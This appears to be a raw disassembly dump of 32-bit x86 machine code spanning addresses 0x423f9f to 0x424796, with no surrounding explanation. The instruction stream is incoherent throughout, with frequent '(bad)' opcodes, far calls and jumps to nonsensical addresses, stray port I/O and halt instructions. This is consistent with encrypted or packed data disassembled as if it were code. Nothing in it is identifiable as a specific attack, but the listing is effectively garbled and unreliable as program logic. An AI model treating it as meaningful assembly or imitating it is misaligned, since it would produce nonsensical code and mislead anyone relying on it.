  423f9f:	arpl   WORD PTR [edx-0x61de0e2e],dx
  423fa5:	(bad)  
  423fa6:	out    0xfb,eax
  423fa8:	add    eax,DWORD PTR [esi]
  423faa:	mov    al,0x64
  423fac:	lods   al,BYTE PTR ds:[esi]
  423fad:	mov    DWORD PTR [eax],ebx
  423faf:	(bad)  
  423fb0:	pop    edx
  423fb1:	push   es
  423fb2:	and    DWORD PTR [eax+0x6730802a],ebx
  423fb8:	mov    bl,0x2d
  423fba:	mov    edx,0xaaf735b8
  423fbf:	mov    dh,0x3e
  423fc1:	and    esi,DWORD PTR [esi]
  423fc3:	scas   al,BYTE PTR es:[edi]
  423fc4:	sbb    DWORD PTR [ebx],ecx
  423fc6:	mov    ds:0x743ce242,al
  423fcb:	lods   al,BYTE PTR ds:[esi]
  423fcc:	mov    BYTE PTR [ebx],cl
  423fce:	leave  
  423fcf:	adc    BYTE PTR [esi],bh
  423fd1:	xchg   esp,eax
  423fd2:	dec    eax
  423fd3:	pusha  
  423fd4:	mov    DWORD PTR [edi-0xa],esp
  423fd7:	aaa    
  423fd8:	pop    ss
  423fd9:	sbb    edi,DWORD PTR [eax-0x7e]
  423fdc:	dec    esp
  423fdd:	call   0x1349a4ef
  423fe2:	push   ebx
  423fe3:	add    DWORD PTR ds:0x28d08ffd,0x7a
  423fea:	cmp    al,0xdf
  423fec:	mov    edi,0x60e0ec5c
  423ff1:	xor    cl,BYTE PTR [edx-0x2ca2a221]
  423ff7:	int3   
  423ff8:	jle    0x424007
  423ffa:	jle    0x423f80
  423ffc:	out    0xd1,al
  423ffe:	inc    ebx
  423fff:	add    DWORD PTR [esi+esi*4+0x7a],edx
  424003:	cmp    BYTE PTR [ebp+0x8],bl
  424006:	loope  0x423fd7
  424008:	mov    DWORD PTR [edx+0x2e],edi
  42400b:	test   eax,0x21dc139e
  424010:	in     eax,0x19
  424012:	pop    ebx
  424013:	outs   dx,DWORD PTR ds:[esi]
  424014:	xor    al,0x34
  424016:	ins    DWORD PTR es:[edi],dx
  424017:	test   eax,0xceeb6836
  42401c:	mov    al,ds:0x9881ccd8
  424021:	mov    esi,DWORD PTR [edi]
  424023:	data16 test al,0x4a
  424026:	push   ebx
  424027:	push   edx
  424028:	fs pop ss
  42402a:	call   0x33:0x5b72e878
  424031:	in     eax,0xfd
  424033:	pop    eax
  424034:	xor    esi,ecx
  424036:	sbb    al,0x3e
  424039:	(bad)  
  42403a:	clc    
  42403b:	imul   ebx,DWORD PTR [esi-0x24119efd],0x89802a
  424045:	in     al,0x60
  424047:	retf   0x4a86
  42404a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42404b:	pop    ds
  42404c:	or     edi,ebp
  42404e:	mov    ah,0xa9
  424050:	iret   
  424051:	jmp    FWORD PTR [ebx+0x2c]
  424054:	xor    DWORD PTR [ebp-0x16],0x63
  424058:	sub    DWORD PTR [ebx],edi
  42405a:	lods   al,BYTE PTR ds:[esi]
  42405b:	or     ebp,DWORD PTR [edi]
  42405d:	dec    esp
  42405e:	test   eax,0x16b5777a
  424063:	push   esp
  424064:	jmp    0x4fe215af
  424069:	inc    ebp
  42406a:	imul   BYTE PTR [ebx+0x64d7afca]
  424070:	bound  edi,QWORD PTR [esi+ecx*4-0x3749105b]
  424077:	idiv   DWORD PTR [ebx-0x46b51fdc]
  42407d:	mov    DWORD PTR [edi-0x46c7a4b7],ebx
  424083:	fcmovb st,st(2)
  424085:	inc    edi
  424086:	jne    0x424073
  424088:	in     al,dx
  424089:	mov    al,0x4e
  42408b:	mov    ss,WORD PTR [eax+0x49]
  42408e:	cs jns 0x4240c3
  424091:	or     edx,ebp
  424093:	out    0x6f,eax
  424095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424096:	loope  0x4240f8
  424098:	lahf   
  424099:	in     eax,0xe2
  42409b:	cmp    al,0xa9
  42409d:	imul   ebp,DWORD PTR [edi],0x45
  4240a0:	fidivr WORD PTR [ecx]
  4240a2:	dec    edx
  4240a3:	mov    BYTE PTR [ecx],ch
  4240a5:	push   cs
  4240a6:	imul   DWORD PTR [edi+0x42]
  4240a9:	ins    DWORD PTR es:[edi],dx
  4240aa:	mov    esp,0xfb77650
  4240af:	jmp    0xb614e1e6
  4240b4:	push   esi
  4240b5:	adc    bh,cl
  4240b7:	(bad)  
  4240b8:	dec    edx
  4240b9:	call   0x225c:0x56152518
  4240c0:	add    bh,bl
  4240c2:	and    eax,0xf97c4240
  4240c7:	and    ah,ch
  4240c9:	int    0x42
  4240cb:	sbb    DWORD PTR [edx],esp
  4240cd:	adc    eax,0xc840db4c
  4240d2:	and    BYTE PTR [esi+0x13],bh
  4240d5:	and    cl,BYTE PTR [ebx]
  4240d7:	adc    DWORD PTR ds:0x432459bb,ecx
  4240dd:	dec    esi
  4240de:	adc    BYTE PTR [ebx-0x627f9ed7],al
  4240e4:	enter  0xe241,0xe8
  4240e8:	(bad)  
  4240eb:	mov    cl,0x16
  4240ed:	bound  ecx,QWORD PTR [ecx+0x3ea7c396]
  4240f3:	mov    ebx,0x1bd5d543
  4240f8:	push   ebp
  4240f9:	push   es
  4240fa:	shl    BYTE PTR [eax],1
  4240fc:	ficom  WORD PTR [edi]
  4240fe:	in     al,0x8a
  424100:	sub    al,BYTE PTR [esi+0x56fc0bcb]
  424106:	jns    0x42411b
  424108:	dec    edi
  424109:	ins    DWORD PTR es:[edi],dx
  42410a:	or     eax,0x1dfeaa82
  42410f:	jle    0x42409c
  424111:	sub    DWORD PTR [ecx+0x4c00c296],eax
  424117:	out    0x25,al
  424119:	inc    esp
  42411a:	sub    al,0x88
  42411c:	inc    esi
  42411d:	(bad)  
  42411e:	push   edx
  42411f:	sbb    BYTE PTR [esi-0x559fd4e7],bl
  424125:	cmp    ebx,eax
  424127:	pop    es
  424128:	dec    eax
  424129:	in     al,dx
  42412a:	or     ah,dl
  42412c:	out    dx,al
  42412d:	push   esp
  42412e:	addr16 and eax,0xc8011f01
  424134:	jns    0x424187
  424136:	lock stc 
  424138:	add    BYTE PTR [edi],ah
  42413a:	out    0xf2,al
  42413c:	aam    0x7f
  42413e:	mov    bh,BYTE PTR [ebx-0xb]
  424141:	mov    ch,0x64
  424143:	sbb    cl,bh
  424145:	(bad)  [ecx]
  424147:	in     al,dx
  424148:	retf   
  424149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42414a:	mov    cl,0x55
  42414c:	fadd   QWORD PTR [esi+edx*4+0x12]
  424150:	fld    TBYTE PTR [ebp+0x19dae155]
  424156:	fs inc edi
  424158:	jae    0x42419e
  42415a:	or     ecx,DWORD PTR [ebp+0x5d]
  42415d:	pushf  
  42415e:	jae    0x4240e5
  424160:	iret   
  424161:	jmp    0x51d2:0xce7897f0
  424168:	xchg   ebp,eax
  424169:	pop    edx
  42416a:	pop    ebx
  42416b:	inc    esp
  42416c:	dec    ebp
  42416d:	dec    ecx
  42416e:	jg     0x4240fe
  424170:	cld    
  424171:	enter  0xc48,0xd7
  424175:	push   ecx
  424176:	test   al,0x5c
  424178:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424179:	scas   al,BYTE PTR es:[edi]
  42417a:	xlat   BYTE PTR ds:[ebx]
  42417b:	and    bl,ah
  42417d:	jle    0x42410c
  42417f:	ffree  st(1)
  424181:	(bad)  
  424182:	out    dx,eax
  424183:	in     eax,dx
  424184:	pusha  
  424185:	popa   
  424186:	lea    esp,[edi-0x58]
  424189:	loopne 0x42416b
  42418b:	(bad)  [ebp+0x77f64e3e]
  424191:	mov    ds:0xff6f75a2,al
  424196:	add    eax,0x849ec919
  42419b:	(bad)  
  42419c:	std    
  42419d:	adc    BYTE PTR ds:0x2d64eccd,dl
  4241a3:	inc    esi
  4241a4:	inc    ecx
  4241a5:	inc    ecx
  4241a6:	add    al,0xb9
  4241a8:	leave  
  4241a9:	or     BYTE PTR [edx-0x30e2a256],dl
  4241af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241b0:	retf   0xb8c7
  4241b3:	das    
  4241b4:	call   0x6afc:0x1913fc6
  4241bb:	mov    ecx,0xb9479783
  4241c0:	mov    dh,BYTE PTR ds:0x43d87515
  4241c6:	xor    bl,0x2a
  4241c9:	imul   DWORD PTR [ebp+0x3c]
  4241cc:	pop    ss
  4241cd:	leave  
  4241ce:	loop   0x424207
  4241d0:	mov    ebx,0x2a9ba241
  4241d5:	ds push edx
  4241d7:	stos   DWORD PTR es:[edi],eax
  4241d8:	jmp    0xf8f2d852
  4241dd:	sbb    esp,esi
  4241df:	jne    0x4241a3
  4241e1:	and    DWORD PTR [edx],edi
  4241e3:	and    eax,0xcee5ef0b
  4241e8:	(bad)  
  4241e9:	push   eax
  4241ea:	cmc    
  4241eb:	jns    0x424235
  4241ed:	and    eax,0x33ba593e
  4241f2:	sbb    esi,esi
  4241f4:	les    ecx,FWORD PTR [ecx+0xb]
  4241f7:	mov    esp,0x458def6
  4241fc:	imul   edi,DWORD PTR [di+0x1d],0x42
  424201:	lods   eax,DWORD PTR ds:[esi]
  424202:	rcr    bh,cl
  424204:	pop    edi
  424205:	xchg   esi,eax
  424206:	ins    BYTE PTR es:[edi],dx
  424207:	jecxz  0x4241f6
  424209:	adc    ecx,DWORD PTR [esi]
  42420b:	push   cs
  42420c:	inc    esi
  42420d:	mov    ebx,0x6f1e178
  424212:	mov    ?,WORD PTR [ebp+0x7]
  424215:	or     al,0xc0
  424217:	mov    WORD PTR [ebx*8-0x6a07313e],es
  42421e:	popa   
  42421f:	jecxz  0x4241cf
  424221:	or     BYTE PTR ds:0x206c2b,bh
  424227:	adc    esp,DWORD PTR [esi+0x296a169a]
  42422d:	hlt    
  42422e:	mov    al,ds:0xe576bb22
  424233:	sar    eax,cl
  424235:	fist   DWORD PTR [eax+0x4c]
  424238:	mov    bh,0xb7
  42423a:	sub    dh,BYTE PTR [ebp+0x3a]
  42423d:	sbb    BYTE PTR [ebx-0x4757b0dc],ah
  424243:	jbe    0x42421a
  424245:	mov    ds,WORD PTR [ebx+0x11]
  424248:	jo     0x42426a
  42424a:	mov    al,ds:0xaea9685b
  42424f:	mov    ecx,0xe0cc6e8e
  424254:	loop   0x42424f
  424256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424257:	cmp    dh,0x2d
  42425a:	fucomp st(7)
  42425c:	out    dx,eax
  42425d:	push   es
  42425e:	jmp    0x291c:0xaa947b4
  424265:	push   esi
  424266:	icebp  
  424267:	jno    0x4242ab
  424269:	and    al,0xd5
  42426b:	std    
  42426c:	test   BYTE PTR [ebp+0x4e],0xfa
  424270:	or     al,dl
  424272:	cmp    edx,ebp
  424274:	jg     0x4242b3
  424276:	ins    DWORD PTR es:[edi],dx
  424277:	stos   DWORD PTR es:[edi],eax
  424278:	adc    dl,BYTE PTR [eax-0x72]
  42427b:	push   esi
  42427c:	and    ecx,DWORD PTR [esi]
  42427e:	jb     0x4242e4
  424280:	test   eax,0xe8e24db0
  424285:	and    DWORD PTR [ebp-0x5c],eax
  424288:	icebp  
  424289:	mov    esp,ecx
  42428b:	ss call 0x7a40:0x762c2a6b
  424293:	or     eax,0x93e06f8
  424298:	jg     0x4242af
  42429a:	jge    0x4242eb
  42429c:	ret    0x52a
  42429f:	neg    BYTE PTR [ebx+0x1fa693e9]
  4242a5:	pop    eax
  4242a6:	hlt    
  4242a7:	loopne 0x424257
  4242a9:	ja     0x4242b3
  4242ab:	sbb    al,0xf8
  4242ad:	rol    BYTE PTR [ecx+0x8],cl
  4242b0:	(bad)  
  4242b1:	hlt    
  4242b2:	popf   
  4242b3:	test   DWORD PTR [edx+eiz*8],0xc8071aef
  4242ba:	xor    al,0xa2
  4242bc:	test   BYTE PTR [ebp-0x3fa67a31],0x7b
  4242c3:	fild   WORD PTR [esi+eax*1-0x6e]
  4242c7:	dec    esi
  4242c8:	sub    ecx,DWORD PTR [eax-0x6148f335]
  4242ce:	lock sahf 
  4242d0:	jae    0x4242b0
  4242d2:	cmp    DWORD PTR [ebx+ecx*4-0x3e39df24],0xf5544f3f
  4242dd:	dec    ebp
  4242de:	inc    edx
  4242df:	fst    QWORD PTR [edi]
  4242e1:	inc    edi
  4242e2:	inc    esi
  4242e3:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242e5:	pop    ebx
  4242e6:	sub    edi,eax
  4242e8:	loopne 0x4242c0
  4242ea:	loopne 0x4242e6
  4242ec:	iret   
  4242ed:	ret    0x18f
  4242f0:	call   0x16a32e6d
  4242f5:	mov    dl,BYTE PTR [eax]
  4242f7:	inc    edx
  4242f8:	ja     0x4242da
  4242fa:	and    edx,DWORD PTR [edx]
  4242fc:	xchg   ebx,eax
  4242fd:	or     DWORD PTR [eax-0x72033c79],ebx
  424303:	jmp    0xfd502d3a
  424308:	push   esi
  424309:	adc    BYTE PTR [ebp-0xf8cc748],cl
  42430f:	popa   
  424310:	rep outs dx,BYTE PTR ds:[esi]
  424312:	or     al,0x10
  424314:	rol    BYTE PTR [ecx+0x7e],0x38
  424318:	jmp    0x4242cf
  42431a:	lds    ebx,FWORD PTR [edx+0x13238ecf]
  424320:	dec    ecx
  424321:	call   0xca35aedc
  424326:	add    al,0xd6
  424328:	ss push esi
  42432a:	pusha  
  42432b:	xor    eax,0xc7e7082a
  424330:	mov    BYTE PTR [edx],al
  424332:	push   esp
  424333:	xor    cl,BYTE PTR [ebp+0x12]
  424336:	in     eax,dx
  424337:	inc    esi
  424338:	pop    ebp
  424339:	shl    DWORD PTR [di],cl
  42433c:	sbb    al,0x15
  42433e:	jae    0x42431f
  424340:	rcr    DWORD PTR [ecx],cl
  424342:	nop
  424343:	push   ss
  424344:	mov    eax,ds:0x5a15506f
  424349:	mov    esp,es
  42434b:	adc    ebp,ecx
  42434d:	gs jo  0x4243cb
  424350:	popf   
  424351:	adc    bl,BYTE PTR [edi+0x73cabbab]
  424357:	jbe    0x4243bf
  424359:	mov    bl,0xa9
  42435b:	cmp    eax,0x53fe7f27
  424360:	dec    ecx
  424361:	mov    eax,0x9ef47d0b
  424366:	sub    ecx,esp
  424368:	test   eax,0x8d6d0b
  42436d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42436e:	mov    eax,0x4cc71886
  424373:	mov    ds:0xa2672610,al
  424378:	xor    esi,DWORD PTR [ecx-0x6439b2b]
  42437e:	mov    BYTE PTR [ebx+0x49c0256],ch
  424384:	cdq    
  424385:	lea    esp,[esi-0x3d]
  424388:	mov    edx,0x122ee4f7
  42438d:	cli    
  42438e:	inc    ebp
  42438f:	and    dl,BYTE PTR [esi-0x1ffaeb1]
  424395:	in     al,dx
  424396:	jp     0x4243a3
  424398:	xlat   BYTE PTR ds:[ebx]
  424399:	test   DWORD PTR [ebp-0x27],edx
  42439c:	popa   
  42439d:	scas   al,BYTE PTR es:[edi]
  42439e:	or     BYTE PTR [ecx],dl
  4243a0:	stos   DWORD PTR es:[edi],eax
  4243a1:	mov    edx,0xb2749940
  4243a6:	fs gs lock mov esi,0xb9ef0f40
  4243ae:	mov    eax,0xd4482dbe
  4243b3:	mov    WORD PTR ds:[edx],ss
  4243b6:	mov    esi,0x8e2f75fc
  4243bb:	sub    edx,edx
  4243bd:	(bad)  
  4243be:	aaa    
  4243bf:	push   edx
  4243c0:	adc    edi,eax
  4243c2:	pop    edi
  4243c3:	popf   
  4243c4:	es out dx,al
  4243c6:	daa    
  4243c7:	aad    0x3f
  4243c9:	rcl    BYTE PTR [ebp+0x46],cl
  4243cc:	in     eax,dx
  4243cd:	not    BYTE PTR es:[eax+0x1ab4ae51]
  4243d4:	js     0x4243c1
  4243d6:	inc    esp
  4243d7:	adc    ah,BYTE PTR [edi+edx*1]
  4243da:	cmp    al,0x55
  4243dc:	ins    DWORD PTR es:[edi],dx
  4243dd:	loope  0x424431
  4243df:	mov    ebp,DWORD PTR [edx+0x5]
  4243e2:	cmp    edi,edi
  4243e4:	or     al,0x6f
  4243e6:	icebp  
  4243e7:	fsubp  st(1),st
  4243e9:	es out dx,al
  4243eb:	fmul   DWORD PTR [ebx-0x1a]
  4243ee:	stc    
  4243ef:	int    0x12
  4243f1:	mov    esi,0xa6e9e852
  4243f6:	xor    BYTE PTR [edx+0x4b],dl
  4243f9:	inc    eax
  4243fa:	mov    esp,0x63caa65e
  4243ff:	xor    dh,BYTE PTR [edx+0x33]
  424402:	(bad)  
  424403:	inc    ebx
  424404:	xor    eax,DWORD PTR [eax]
  424406:	stc    
  424407:	inc    eax
  424408:	mov    BYTE PTR [edi+0xe],bl
  42440b:	mov    ds:0x8f19a248,eax
  424410:	mov    ds:0x2b17e21f,eax
  424415:	test   BYTE PTR [edi+esi*8],bh
  424418:	inc    edi
  424419:	jecxz  0x424453
  42441b:	adc    cl,BYTE PTR [ebx]
  42441d:	and    dl,BYTE PTR [edx+0x6f]
  424420:	loop   0x424483
  424422:	aad    0x91
  424424:	inc    edi
  424425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424426:	dec    ecx
  424427:	test   BYTE PTR [edx],0xba
  42442a:	mov    ds,WORD PTR [esi-0x78]
  42442d:	test   BYTE PTR [edi-0x19],bl
  424430:	out    0xed,al
  424432:	mov    eax,ds:0xd9ba70aa
  424437:	inc    ecx
  424438:	xchg   ebp,eax
  424439:	sbb    esp,DWORD PTR [edi-0xdc83fd4]
  42443f:	jbe    0x424436
  424441:	jo     0x424457
  424443:	adc    ecx,DWORD PTR [ecx-0x3203bdf0]
  424449:	pop    ebx
  42444a:	mov    bh,0xca
  42444c:	clc    
  42444d:	pop    ebp
  42444e:	inc    edx
  42444f:	sahf   
  424450:	push   edi
  424451:	pop    ebx
  424452:	jge    0x4244d0
  424454:	mov    ds:0x6bdfd849,al
  424459:	shl    ecx,0x6
  42445c:	xchg   DWORD PTR [ecx+ebx*4+0x2e],edx
  424460:	aaa    
  424461:	shr    bl,0xa8
  424464:	xchg   BYTE PTR [ecx-0x276f73cf],ah
  42446a:	out    dx,eax
  42446b:	and    al,0x22
  42446d:	call   0xcbfa9009
  424472:	push   0xffffffe1
  424474:	shr    ebp,cl
  424476:	and    dh,ch
  424478:	es call 0x3d1b:0x6debdd38
  424480:	mov    dh,al
  424482:	mov    eax,ds:0x75bfe8be
  424487:	pop    DWORD PTR [ecx-0x2c]
  42448a:	loopne 0x42444f
  42448c:	push   edi
  42448d:	rol    DWORD PTR [edi-0x7bd2f6b3],1
  424493:	outs   dx,DWORD PTR ds:[esi]
  424494:	dec    BYTE PTR [ebx]
  424496:	sbb    bl,bh
  424498:	xor    ebx,ebp
  42449a:	gs repnz mov bh,0x10
  42449e:	mov    bl,0xa9
  4244a0:	pop    ss
  4244a1:	fwait
  4244a2:	jbe    0x4244a6
  4244a4:	and    DWORD PTR [edx+0x61],edi
  4244a7:	add    BYTE PTR [esi],ah
  4244a9:	ins    BYTE PTR es:[edi],dx
  4244aa:	push   ss
  4244ab:	dec    ebx
  4244ac:	jp     0x4244b6
  4244ae:	cmp    esp,DWORD PTR [ebp+0x717e1c50]
  4244b4:	(bad)  
  4244b5:	les    edx,FWORD PTR [eax]
  4244b7:	icebp  
  4244b8:	retf   
  4244b9:	cmp    DWORD PTR [ebx+edx*4-0x26],0x27c69e13
  4244c1:	in     eax,dx
  4244c2:	or     dh,bh
  4244c4:	xchg   ecx,eax
  4244c5:	(bad)  
  4244c7:	popf   
  4244c8:	outs   dx,BYTE PTR ds:[esi]
  4244c9:	add    edi,edi
  4244cb:	mov    eax,0xb408e831
  4244d0:	or     BYTE PTR [edi],bh
  4244d2:	inc    ecx
  4244d3:	inc    esp
  4244d4:	sbb    BYTE PTR [eax+0x54c97824],0x49
  4244db:	fcmovu st,st(6)
  4244dd:	dec    BYTE PTR [edx-0x7fa1dbf6]
  4244e3:	or     BYTE PTR [esi+0x32d00237],bh
  4244e9:	pop    esi
  4244ea:	ret    
  4244eb:	mov    ebx,0xbcc75ca6
  4244f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244f1:	js     0x424528
  4244f3:	int3   
  4244f4:	out    dx,al
  4244f5:	sar    ebx,0xbc
  4244f8:	(bad)  
  4244f9:	adc    eax,0x2e21e89c
  4244fe:	inc    esp
  4244ff:	xor    DWORD PTR [ebp-0x5c0d1439],ebx
  424505:	mov    edx,0x193672f3
  42450a:	xlat   BYTE PTR ds:[ebx]
  42450b:	add    DWORD PTR [ebx],esi
  42450d:	pop    ss
  42450e:	mov    bh,0x4a
  424510:	mov    esp,0x66ad177e
  424515:	or     eax,0x512c1493
  42451a:	pop    esi
  42451b:	aad    0xa1
  42451d:	stos   BYTE PTR es:[edi],al
  42451e:	sbb    BYTE PTR ds:0xbbd40190,cl
  424524:	mov    edx,0xa11a8868
  424529:	aad    0x6e
  42452b:	mov    al,ds:0x4a1333c3
  424530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424531:	enter  0x2240,0x18
  424535:	aad    0x55
  424537:	xchg   edi,eax
  424538:	leave  
  424539:	add    al,0xa8
  42453b:	push   es
  42453c:	mov    ch,0xaa
  42453e:	push   esp
  42453f:	(bad)  
  424540:	cmp    al,al
  424542:	idiv   DWORD PTR [ebp+0x62fb0931]
  424548:	add    ebp,esi
  42454a:	lds    edx,FWORD PTR [esi]
  42454c:	sahf   
  42454d:	daa    
  42454e:	sub    al,0x3e
  424550:	rcr    DWORD PTR [edi],cl
  424552:	test   al,0x82
  424554:	mov    ds:0xcc78ac02,al
  424559:	shl    DWORD PTR [ebp+eax*1-0x36],1
  42455d:	pop    esi
  42455e:	retf   
  42455f:	cmp    al,BYTE PTR [ecx+eiz*8-0x279dca55]
  424566:	adc    al,0x43
  424568:	in     eax,dx
  424569:	mov    eax,0x6f71bf37
  42456e:	mov    fs,WORD PTR [ebx-0x4159edd]
  424574:	jge    0x424520
  424576:	mov    al,ds:0xa776b47d
  42457b:	mov    cl,0xfb
  42457d:	fs adc ebx,esi
  424580:	pop    esp
  424581:	test   BYTE PTR [esi],bh
  424583:	das    
  424584:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  424586:	push   esp
  424587:	sub    DWORD PTR [ecx+0x2efdc218],esi
  42458d:	push   ds
  42458e:	mov    eax,ds:0xfc970f74
  424593:	xchg   esp,eax
  424594:	sub    al,0xb5
  424596:	xchg   esi,eax
  424597:	dec    edi
  424598:	push   ds
  424599:	and    dh,bl
  42459b:	pop    esi
  42459c:	or     esp,ebx
  42459e:	in     eax,0xb9
  4245a0:	nop
  4245a1:	push   cs
  4245a2:	push   0x3a
  4245a4:	shr    BYTE PTR [edx-0x46b231de],1
  4245aa:	mov    edi,0xc44d2162
  4245af:	fwait
  4245b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245b1:	mov    edx,0x8152d9b7
  4245b6:	inc    ebp
  4245b7:	ins    DWORD PTR es:[edi],dx
  4245b8:	and    ah,BYTE PTR [eax+ebp*1+0x71474dee]
  4245bf:	inc    edx
  4245c0:	rcl    DWORD PTR [edx+0x37],1
  4245c3:	mov    ds:0x325de2dd,al
  4245c8:	enter  0xa3db,0x4d
  4245cc:	cld    
  4245cd:	mov    edi,0x134c3d3d
  4245d2:	lea    ebx,[eax+edi*1+0x4e63c6d9]
  4245d9:	jg     0x424596
  4245db:	sub    BYTE PTR [esp+esi*8-0x589cd3e8],ch
  4245e2:	or     ebx,ebx
  4245e4:	fs add bl,bl
  4245e7:	sub    BYTE PTR ss:[eax+0x43fa0087],0x93
  4245ef:	pop    ss
  4245f0:	lahf   
  4245f1:	test   al,0xd2
  4245f3:	jmp    DWORD PTR [ebp-0x2b72041a]
  4245f9:	dec    ebx
  4245fa:	ss xchg ebx,eax
  4245fc:	aam    0x53
  4245fe:	inc    esi
  4245ff:	inc    edi
  424600:	lock aad 0x62
  424603:	or     eax,0x950b6699
  424608:	je     0x42465c
  42460a:	push   edi
  42460b:	in     al,0x99
  42460d:	dec    eax
  42460e:	inc    esp
  42460f:	push   eax
  424610:	ins    DWORD PTR es:[edi],dx
  424611:	push   eax
  424612:	inc    edx
  424613:	ja     0x42461c
  424615:	xor    edi,edi
  424617:	xchg   esi,eax
  424618:	fcmovnb st,st(5)
  42461a:	repz mov ch,0x3a
  42461d:	outs   dx,BYTE PTR ds:[esi]
  42461e:	iret   
  42461f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424620:	push   eax
  424621:	jmp    0xc265:0x5062f407
  424628:	push   edx
  424629:	fwait
  42462a:	push   edx
  42462b:	ds imul esp,ebx,0xf8aad7a7
  424632:	rcl    BYTE PTR [esi+eax*1+0x6f],cl
  424636:	je     0x424655
  424638:	jl     0x4245ca
  42463a:	lahf   
  42463b:	aas    
  42463c:	mov    dh,0xb8
  42463e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42463f:	or     eax,edi
  424641:	sbb    bh,BYTE PTR [esi-0x37]
  424644:	dec    esi
  424645:	lea    edx,[ebx-0x40d5562d]
  42464b:	or     eax,0xdda75444
  424650:	push   0xd56aef04
  424655:	xor    BYTE PTR [edi+0x28],dl
  424658:	jno    0x42466d
  42465a:	add    bh,BYTE PTR [eax]
  42465c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42465d:	mov    eax,0xa48d9938
  424662:	push   eax
  424663:	retf   0x1584
  424666:	mov    cl,0x9b
  424668:	popf   
  424669:	push   ebp
  42466a:	and    eax,0x80184798
  42466f:	sbb    DWORD PTR ds:0xc219b25,ebx
  424675:	loopne 0x424672
  424677:	sbb    eax,eax
  424679:	dec    esp
  42467a:	add    bl,BYTE PTR [eax]
  42467c:	mov    es,WORD PTR [eax+0x4429a913]
  424682:	xor    DWORD PTR [esi*1+0x11980185],ebp
  424689:	js     0x42466d
  42468b:	inc    edx
  42468c:	adc    esp,ebx
  42468e:	mov    eax,ds:0xe035ade3
  424693:	xor    ebx,esi
  424695:	mov    BYTE PTR [edi-0x20],dh
  424698:	rol    dh,cl
  42469a:	add    DWORD PTR [eax+ebx*1-0x61],ecx
  42469e:	std    
  42469f:	and    al,0xa9
  4246a1:	in     eax,dx
  4246a2:	fwait
  4246a3:	mov    esp,0xbd179378
  4246a8:	sahf   
  4246a9:	pop    ss
  4246aa:	stc    
  4246ab:	xlat   BYTE PTR ds:[ebx]
  4246ac:	rol    BYTE PTR [eax-0x2e],cl
  4246af:	or     ebx,edx
  4246b1:	adc    ebp,DWORD PTR [ebx+0x77]
  4246b4:	or     edi,DWORD PTR [esi+0x7034c3bd]
  4246ba:	mov    ah,ch
  4246bc:	pop    esi
  4246bd:	or     al,0xa1
  4246bf:	popa   
  4246c0:	arpl   WORD PTR [esi],cx
  4246c2:	data16 fsubr DWORD PTR [edi+0x276020a0]
  4246c9:	jp     0x4246fb
  4246cb:	or     eax,0x514f329d
  4246d0:	arpl   WORD PTR [esi-0x44],ax
  4246d3:	xchg   DWORD PTR [edx-0x1feaeeeb],ecx
  4246d9:	ss dec esi
  4246db:	jp     0x42466f
  4246dd:	aaa    
  4246de:	clc    
  4246df:	pop    ds
  4246e0:	push   edi
  4246e1:	pop    esp
  4246e2:	pop    DWORD PTR [edi]
  4246e4:	ss (bad) 
  4246e6:	mov    al,0x2f
  4246e8:	xchg   ebx,eax
  4246e9:	xchg   DWORD PTR [ebx],ebx
  4246eb:	or     ch,bl
  4246ed:	outs   dx,BYTE PTR ds:[esi]
  4246ee:	cmp    eax,0xa4740aaa
  4246f3:	dec    edi
  4246f4:	sbb    BYTE PTR [edi],bl
  4246f6:	or     BYTE PTR [ebx+0x5f],ah
  4246f9:	sub    ah,BYTE PTR [edx-0x68d27ab5]
  4246ff:	stos   DWORD PTR es:[edi],eax
  424700:	or     BYTE PTR [edx-0x7d6b553e],ch
  424706:	jmp    0x5c2d5373
  42470b:	pop    ebx
  42470c:	jp     0x42477c
  42470e:	arpl   WORD PTR [ecx+0x4e61753e],sp
  424714:	ds xchg ebp,eax
  424716:	rcr    BYTE PTR [ebp+0x2dc3269a],cl
  42471c:	xor    al,0xaa
  42471e:	retf   0xdd87
  424721:	shl    DWORD PTR [ebx+0x79],cl
  424724:	lock pop ebp
  424726:	shr    DWORD PTR [eax-0xa7ca1a4],cl
  42472c:	push   esp
  42472d:	sbb    eax,0x70f72d4f
  424732:	sub    DWORD PTR [eax+0x2ba4ca54],0x40282121
  42473c:	into   
  42473d:	lds    esi,FWORD PTR [eax-0x6c]
  424740:	arpl   sp,dx
  424742:	and    BYTE PTR [eax+0x3d57b7b4],dl
  424748:	arpl   WORD PTR [edi],bx
  42474a:	repnz fcomp DWORD PTR [ecx]
  42474d:	adc    DWORD PTR [ebx+0x58d2e384],ebp
  424753:	push   esp
  424754:	xlat   BYTE PTR ds:[ebx]
  424755:	cli    
  424756:	mov    edi,0xdc1ceaf3
  42475b:	outs   dx,DWORD PTR ds:[esi]
  42475c:	lods   eax,DWORD PTR ds:[esi]
  42475d:	loope  0x4247c4
  42475f:	jno    0x4247d0
  424761:	and    DWORD PTR [ebp+0x4d1bf503],edi
  424767:	or     edi,DWORD PTR [edi]
  424769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42476a:	sbb    BYTE PTR [ebp-0x2d],bl
  42476d:	aas    
  42476e:	outs   dx,DWORD PTR ds:[esi]
  42476f:	fistp  QWORD PTR [edx+0x3a8f0a6a]
  424775:	jno    0x424749
  424777:	inc    edi
  424778:	pop    es
  424779:	mov    ebx,0x733c7d22
  42477e:	imul   ecx,DWORD PTR [ebx+0x17],0xa2271db0
  424785:	push   ebx
  424786:	in     eax,0xea
  424788:	ss dec ecx
  42478a:	call   0xa139f1a2
  42478f:	inc    ebx
  424790:	add    DWORD PTR [edi-0xb5672a6],esp
  424796:	hlt    
